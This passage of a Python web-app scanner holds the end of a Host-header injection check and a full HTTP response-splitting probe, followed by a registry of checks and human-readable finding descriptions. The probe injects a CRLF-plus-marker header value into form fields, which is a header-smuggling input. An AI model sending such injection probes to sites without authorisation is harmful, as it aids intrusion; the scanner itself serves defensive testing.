    fire if it reflects into a redirect Location or the response body."""
    marker = "hlhost" + secrets.token_hex(4) + ".example"
    routes = [r for r in ctx.profile.routes
              if re.search(r"reset|password|forgot|login|account|verify|link|confirm", r, re.IGNORECASE)]
    targets = list(dict.fromkeys(list(_HOST_TARGETS) + routes))
    with make_client(ctx.base_url, ctx.headers, timeout=10.0, follow_redirects=False) as c:
        for path in targets:
            try:
                baseline = c.get(path)
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
            if not _endpoint_is_live(ctx, c, path, "get", baseline):
                continue   # catch-all / soft-404 host serves this auth route as the SPA shell -> a reflected
                           # Host is the platform echoing it, not the app building a link -> phantom (the FP class)
            for hdr in _HOST_HEADERS:
                try:
                    r = c.get(path, headers={hdr: marker})
                except (httpx.HTTPError, httpx.InvalidURL):
                    continue
                if marker in r.headers.get("location", "") or marker in r.text:
                    ctx.evidence.update(reflected=True, via=hdr, target=path)
                    return True
    ctx.evidence.update(reflected=False, targets=len(targets))
    return False


# HTTP response splitting — CRLF injected into a parameter the app copies into a RESPONSE HEADER (a
# redirect Location, a Set-Cookie) lets an attacker inject headers / split the response. Inject CRLF + a
# unique marker header into reflecting fields; fire if the marker comes back as a real response header.
# Modern servers reject CRLF in header values, so a well-built app reads clean (low false-positive).
def http_response_splitting(ctx, probe) -> bool | None:
    """Inject `<CRLF>Hlsplit: <marker>` into each field; fire if `Hlsplit: <marker>` appears as a real
    response header (the app reflected the raw CRLF into a header). N/A when there's no input surface."""
    targets = _injectable_targets(ctx.profile)
    if not targets:
        return None
    marker = "hlsplit" + secrets.token_hex(4)
    payload = "x\r\nHlsplit: " + marker
    budget = probe.probe.get("max_attempts", 80)
    tested = False
    checked = 0
    with make_client(ctx.base_url, ctx.headers, timeout=10.0, follow_redirects=False) as c:
        for action, method, fields in targets:
            for field in fields:
                if budget <= 0:
                    break
                budget -= 1
                tested = True
                checked += 1
                data = {fn: (payload if fn == field else "1") for fn in fields}
                try:
                    r = _xss_send(c, method, action, data)
                except (httpx.HTTPError, httpx.InvalidURL):
                    continue
                if r.headers.get("hlsplit") == marker:
                    ctx.evidence.update(split=True, target=action, field=field)
                    return True
    ctx.evidence.update(split=False, fields_tested=checked)
    return False if tested else None


PREDICATES = {
    "sqli_auth_bypass": sqli_auth_bypass,
    "api_sqli": api_sqli,
    "xss_injectable": xss_injectable,
    "command_injection": command_injection,
    "ssti_injectable": ssti_injectable,
    "ssrf": ssrf,
    "xxe": xxe,
    "path_traversal": path_traversal,
    "file_upload": file_upload,
    "weak_session_id": weak_session_id,
    "api_bola": api_bola,
    "data_integrity_roundtrip": data_integrity_roundtrip,
    "content_type_mismatch": content_type_mismatch,
    "debug_mode_enabled": debug_mode_enabled,
    "leaks_error_detail": leaks_error_detail,
    "exposed_backend_readable": exposed_backend_readable,
    "bundle_leaks_secret": bundle_leaks_secret,
    "vulnerable_dependency": vulnerable_dependency,
    "source_map_exposed": source_map_exposed,
    "session_cookie_missing_flag": session_cookie_missing_flag,
    "session_token_in_local_storage": session_token_in_local_storage,
    "login_no_rate_limit": login_no_rate_limit,
    "csrf_missing": csrf_missing,
    "idor_horizontal": idor_horizontal,
    "idor_user_record": idor_user_record,
    "bola_managed_backend": bola_managed_backend,
    "dom_xss": dom_xss,
    "race_resource_ids": race_resource_ids,
    "load_resilience": load_resilience,
    "crash_resistance": crash_resistance,
    "declared_constraint_unenforced": declared_constraint_unenforced,
    "perf_ttfb": perf_ttfb,
    "perf_page_weight": perf_page_weight,
    "perf_request_count": perf_request_count,
    "perf_load_time": perf_load_time,
    "caching_ineffective": caching_ineffective,
    "http_soft_404": http_soft_404,
    "a11y_hard_fails": a11y_hard_fails,
    "broken_links": broken_links,
    "mixed_content": mixed_content,
    "seo_meta_missing": seo_meta_missing,
    "http_conformance": http_conformance,
    "slow_first_paint": slow_first_paint,
    "slow_core_web_vitals": slow_core_web_vitals,
    "console_errors_present": console_errors_present,
    "a11y_violations_present": a11y_violations_present,
    "dead_controls_present": dead_controls_present,
    "open_redirect": open_redirect,
    "host_header_injection": host_header_injection,
    "http_response_splitting": http_response_splitting,
    "decompression_bomb": decompression_bomb,
}


# Human-readable "why it fired" reasons for verbose / --failed output, derived from the probe's check.
_MATCHER_REASONS = {
    "ttfb_at_least": "slow time-to-first-byte (>{arg}s)",
    "response_contains": "reflected the probe payload unescaped",
    "response_missing_header": "missing header: {arg}",
    "response_missing_clickjacking_defense": "no clickjacking defense (X-Frame-Options / CSP frame-ancestors)",
    "response_csp_weak": "the Content-Security-Policy is present but toothless against XSS ('unsafe-inline' / wildcard script source with no nonce/hash) -> a false sense of safety",
    "response_cors_misconfigured": "reflects an arbitrary Origin with credentials (CORS)",
    "response_server_error": "returned a 5xx server error",
    "response_uncompressed": "sizeable text served without gzip (no Content-Encoding)",
    "response_has_header": "leaks the {arg} header (stack / version disclosure)",
    "response_is_aws_credentials": "served an AWS credentials file at the webroot",
    "response_leaks_credentials": "returned password/credential material in a response body",
    "response_leaks_secret": "leaked a secret (private key / cloud or API token)",
    "response_is_dotenv": "served a .env secrets file",
    "response_is_git_config": "served .git/config (source repo exposed)",
    "response_is_git_head": "served .git/HEAD (source repo exposed)",
}

_PREDICATE_REASONS = {
    "sqli_auth_bypass": "login bypassed by a SQL-injection payload",
    "api_sqli": "a parameter is SQL-injectable (error / boolean / UNION / time-based)",
    "xss_injectable": "an input reflects unescaped into HTML (XSS: script / img / svg / attribute / stored)",
    "command_injection": "an input reaches an OS shell (injected command executed: separator / substitution / time-based)",
    "ssti_injectable": "an input is evaluated by a server-side template engine (SSTI -> code execution)",
    "ssrf": "the server fetched an attacker-supplied URL (server-side request forgery)",
    "xxe": "the XML parser resolved an external entity to an attacker URL (XXE)",
    "path_traversal": "a filename param served a file outside the web root (path traversal / local file inclusion)",
    "file_upload": "an uploaded webshell was accepted and executed server-side (insecure file upload -> RCE)",
    "weak_session_id": "session identifiers are weak/predictable (short / numeric / sequential)",
    "api_bola": "one account's object (and its secret) was readable by another account (broken object-level auth)",
    "data_integrity_roundtrip": "a created object could not be read back afterward (non-durable write / silent data loss)",
    "content_type_mismatch": "a response's body contradicts its declared Content-Type (e.g. JSON served as text/html -> client breakage / reflected-JSON XSS)",
    "debug_mode_enabled": "framework debug mode is on in production (interactive debugger / DEBUG page -> source, settings, env and an RCE console exposed)",
    "leaks_error_detail": "an induced server error leaked a stack trace or a database error to the user (info disclosure + a broken error path)",
    "exposed_backend_readable": "the app's managed backend (Supabase/Firebase) is world-readable with its own public key -> the whole database is exposed (missing row-level security)",
    "bundle_leaks_secret": "a hardcoded SECRET key (Stripe sk_ / OpenAI / AWS secret / GitHub PAT / private key) is shipped in the client JS bundle -> account/DB takeover (public anon/publishable keys are not flagged)",
    "vulnerable_dependency": "the app ships a client library with a KNOWN CVE (retire.js-style: jQuery / AngularJS / Bootstrap / Axios / Moment / Handlebars / DOMPurify) -> supply-chain risk the team chose; upgrade per the finding",
    "source_map_exposed": "a production JS bundle serves its .map -> the original source is reconstructable (business logic, hidden endpoints, and secrets a minified scan misses)",
    "session_cookie_missing_flag": "session cookie missing the {flag} flag",
    "session_token_in_local_storage": "session token persisted in localStorage (readable by any XSS on the origin — unlike an HttpOnly cookie)",
    "csrf_missing": "state-changing POST accepted cross-site with no token / SameSite",
    "idor_horizontal": "another account's object was readable by id (broken access control)",
    "idor_user_record": "one account's private user record was readable by another account by id (horizontal IDOR / broken object-level auth)",
    "bola_managed_backend": "the managed backend (Supabase) let one account read another's private row -> per-user Row-Level Security is broken (the app's own RLS config)",
    "dom_xss": "an injected payload executed in the DOM",
    "race_resource_ids": "concurrent creates collided on one id (non-atomic allocation)",
    "load_resilience": "endpoint 5xx'd under a concurrent burst",
    "crash_resistance": "malformed input caused an unhandled 5xx instead of a graceful 4xx",
    "declared_constraint_unenforced": "the server accepted a value violating the app's own declared field constraint (type=email/number/... -> client-only validation)",
    "perf_ttfb": "slow server response (time-to-first-byte over the perf budget)",
    "perf_page_weight": "heavy page (transfer weight over the perf budget)",
    "perf_request_count": "too many requests to render the homepage (over the perf budget)",
    "perf_load_time": "homepage load time crosses the ~5s user-abandonment ceiling",
    "caching_ineffective": "static asset not cacheable (no validator / no-store / ignored revalidation) -> refetched every load",
    "http_soft_404": "a nonexistent static asset returned 2xx instead of 404 (soft-404 -> pollutes caches / crawlers / monitoring)",
    "a11y_hard_fails": "accessibility hard-fail (missing lang / alt / form-control name / page title, or text below the 3:1 contrast floor)",
    "broken_links": "an internal link leads to a 4xx dead end (broken navigation)",
    "mixed_content": "an https page loads a subresource over plain http:// (mixed content -> MITM-tamperable; active mixed content is browser-blocked, breaking the page)",
    "seo_meta_missing": "missing a best-practice meta tag (viewport -> unusable on mobile, or description -> no search snippet)",
    "http_conformance": "HTML response served with no declared charset (browser must guess the encoding -> mojibake / UTF-7 XSS surface)",
    "slow_first_paint": "First Contentful Paint exceeded the gate",
    "slow_core_web_vitals": "Core Web Vitals poor on the best of N throttled samples (slow LCP / layout shift / main-thread blocking)",
    "login_no_rate_limit": "repeated wrong-password logins were never throttled",
    "console_errors_present": "threw an uncaught JavaScript error on load",
    "dead_controls_present": "clickable controls wired to nothing (no effect on click) — non-functional UI",
    "a11y_violations_present": "accessibility violations (missing alt / form label / lang / control name)",
    "open_redirect": "a user-controlled parameter redirects to an arbitrary external host",
    "host_header_injection": "a client-controlled Host / X-Forwarded-Host header reflects into a URL / redirect (cache + password-reset poisoning)",
    "http_response_splitting": "CRLF injected into a parameter reflects into a response header (header injection / response splitting)",
    "decompression_bomb": "decompresses gzip request bodies with no size cap (a zip bomb would exhaust memory -> DoS)",
}


def describe(probe) -> str:
    """Short human reason a probe fires (for verbose / --failed), derived from its predicate or
    slop_if conditions — not live evidence, but enough to know what failed and act on it."""
    p = probe.probe
    if "predicate" in p:
        return _PREDICATE_REASONS.get(p["predicate"], p["predicate"]).format(flag=p.get("flag", ""))
    parts = []
    for cond in probe.slop_if:
        if isinstance(cond, str):
            parts.append(_MATCHER_REASONS.get(cond, cond))
        else:
            ((name, arg),) = cond.items()
            parts.append(_MATCHER_REASONS.get(name, name).format(arg=arg))
    return "; ".join(parts)
